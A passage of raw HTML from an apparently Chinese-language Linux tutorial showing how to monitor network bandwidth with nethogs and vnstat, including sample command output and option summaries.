来获取过滤指南）。</p>\n<h3 id=\"toc_2\">nethogs</h3>\n<p>当你想要快速了解是谁在吸取你的带宽的时候，<code>nethogs</code> 是个快速而简单的方法。你需要以 root 身份运行并指定要监听的接口。它会给你显示大量的应用程序及其进程号，所以如果你想的话，你可以借此杀死任一进程。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af36876168259599\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo nethogs wlan0\r\n\r\nnethogs version 0.8.1\r\n\r\nPID USER   PROGRAM              DEV    SENT   RECEIVED       \r\n7690 carla /usr/lib/firefox     wlan0 12.494 556.580 KB/sec\r\n5648 carla .../chromium-browser wlan0  0.052   0.038 KB/sec\r\nTOTAL                                 12.546 556.618 KB/sec \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af36876168259599-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af36876168259599-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af36876168259599-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af36876168259599-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af36876168259599-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af36876168259599-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af36876168259599-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af36876168259599-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af36876168259599-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af36876168259599-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">nethogs </span><span class=\"crayon-e\">wlan0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af36876168259599-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37af36876168259599-3\"><span class=\"crayon-e\">nethogs </span><span class=\"crayon-i\">version</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.8.1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af36876168259599-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37af36876168259599-5\"><span class=\"crayon-e\">PID </span><span class=\"crayon-e\">USER   </span><span class=\"crayon-e\">PROGRAM              </span><span class=\"crayon-e\">DEV    </span><span class=\"crayon-e\">SENT   </span><span class=\"crayon-i\">RECEIVED</span><span class=\"crayon-h\">       </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af36876168259599-6\"><span class=\"crayon-cn\">7690</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">carla</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">firefox     </span><span class=\"crayon-i\">wlan0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12.494</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">556.580</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">KB</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">sec</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af36876168259599-7\"><span class=\"crayon-cn\">5648</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">carla</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">chromium</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">browser </span><span class=\"crayon-i\">wlan0</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.052</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0.038</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">KB</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">sec</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af36876168259599-8\"><span class=\"crayon-i\">TOTAL</span><span class=\"crayon-h\">                                 </span><span class=\"crayon-cn\">12.546</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">556.618</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">KB</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">sec</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af36876168259599-9\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p><code>nethogs</code> 并没有多少选项：在 kb/s、kb、b、mb之间循环，按接收和发送的数据包排序，调整刷新延迟。具体请看<code>man nethogs</code>，或者是运行 <code>nethogs -h</code>。</p>\n<h3 id=\"toc_3\">vnstat</h3>\n<p><a href=\"http://humdi.net/vnstat/\">vnstat</a>是最容易使用的网络数据收集工具。它十分轻量并且不需要 root 权限。它以守护进程在后台运行，因此可以实时地记录你的网络数据。单个 <code>vnstat</code> 命令就可以显示所累计的数据。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af3687b080868863\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ vnstat -i wlan0\r\nDatabase updated: Tue Oct 17 08:36:38 2017\r\n\r\n   wlan0 since 10/17/2017\r\n\r\n          rx:  45.27 MiB      tx:  3.77 MiB      total:  49.04 MiB\r\n\r\n   monthly\r\n                     rx      |     tx      |    total    |   avg. rate\r\n     ------------------------+-------------+-------------+---------------\r\n       Oct '17     45.27 MiB |    3.77 MiB |   49.04 MiB |    0.28 kbit/s\r\n     ------------------------+-------------+-------------+---------------\r\n     estimated        85 MiB |       5 MiB |      90 MiB |\r\n\r\n   daily\r\n                     rx      |     tx      |    total    |   avg. rate\r\n     ------------------------+-------------+-------------+---------------\r\n         today     45.27 MiB |    3.77 MiB |   49.04 MiB |   12.96 kbit/s\r\n     ------------------------+-------------+-------------+---------------\r\n     estimated       125 MiB |       8 MiB |     133 MiB |\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3687b080868863-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3687b080868863-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3687b080868863-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3687b080868863-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3687b080868863-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3687b080868863-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3687b080868863-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3687b080868863-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3687b080868863-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3687b080868863-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3687b080868863-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3687b080868863-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3687b080868863-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3687b080868863-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3687b080868863-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3687b080868863-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3687b080868863-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3687b080868863-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3687b080868863-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3687b080868863-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3687b080868863-21\">21</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af3687b080868863-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">vnstat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">wlan0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3687b080868863-2\"><span class=\"crayon-e\">Database </span><span class=\"crayon-v\">updated</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Tue </span><span class=\"crayon-i\">Oct</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">17</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">36</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">38</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2017</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af3687b080868863-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3687b080868863-4\"><span class=\"crayon-h\">   </span><span class=\"crayon-e\">wlan0 </span><span class=\"crayon-i\">since</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">17</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">2017</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af3687b080868863-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3687b080868863-6\"><span class=\"crayon-h\">          </span><span class=\"crayon-v\">rx</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">45.27</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">MiB      </span><span class=\"crayon-v\">tx</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">3.77</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">MiB      </span><span class=\"crayon-v\">total</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">49.04</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">MiB</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af3687b080868863-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3687b080868863-8\"><span class=\"crayon-e\">   </span><span class=\"crayon-e\">monthly</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af3687b080868863-9\"><span class=\"crayon-e\">                     </span><span class=\"crayon-v\">rx</span><span class=\"crayon-h\">      </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-v\">tx</span><span class=\"crayon-h\">      </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">    </span><span class=\"crayon-v\">total</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">   </span><span class=\"crayon-v\">avg</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rate</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3687b080868863-10\"><span class=\"crayon-h\">     </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af3687b080868863-11\"><span class=\"crayon-h\">       </span><span class=\"crayon-i\">Oct</span><span class=\"crayon-h\"> </span>'<span class=\"crayon-cn\">17</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">45.27</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MiB</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">3.77</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MiB</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">49.04</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MiB</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0.28</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">kbit</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">s</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3687b080868863-12\"><span class=\"crayon-h\">     </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af3687b080868863-13\"><span class=\"crayon-h\">     </span><span class=\"crayon-i\">estimated</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">85</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MiB</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MiB</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">90</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MiB</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3687b080868863-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f37af3687b080868863-15\"><span class=\"crayon-h\">   </span><span class=\"crayon-e\">daily</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3687b080868863-16\"><span class=\"crayon-e\">                     </span><span class=\"crayon-v\">rx</span><span class=\"crayon-h\">      </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-v\">tx</span><span class=\"crayon-h\">      </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">    </span><span class=\"crayon-v\">total</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">   </span><span class=\"crayon-v\">avg</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rate</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af3687b080868863-17\"><span class=\"crayon-h\">     </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3687b080868863-18\"><span class=\"crayon-h\">         </span><span class=\"crayon-i\">today</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">45.27</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MiB</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">3.77</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MiB</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">49.04</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MiB</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">12.96</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">kbit</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">s</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af3687b080868863-19\"><span class=\"crayon-h\">     </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3687b080868863-20\"><span class=\"crayon-h\">     </span><span class=\"crayon-i\">estimated</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">125</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MiB</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MiB</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">133</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">MiB</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af3687b080868863-21\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0064 seconds] -->\r\n<p>默认情况下它会显示所有的网络接口。使用 <code>-i</code> 选项来选择某个接口。也可以像这样合并多个接口的数据：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af3687f757371823\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ vnstat -i wlan0+eth0+eth1\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3687f757371823-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3687f757371823-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af3687f757371823-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">vnstat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wlan0</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">eth0</span><span class=\"crayon-o\">+</span><span class=\"crayon-i\">eth1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3687f757371823-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>你可以通过这几种方式过滤数据显示：</p>\n<ul>\n<li><code>-h</code> 按小时显示统计信息。</li>\n<li><code>-d</code> 按天显示统计信息.</li>\n<li><code>-w</code> 和 <code>-m</code> 分别按周和月份来显示统计信息。</li>\n<li>使用 <code>-l</code> 选项查看实时更新。</li>\n</ul>\n<p>以下这条命令将会删除 wlan1 的数据库并不再监视它：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af36882806951666\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" 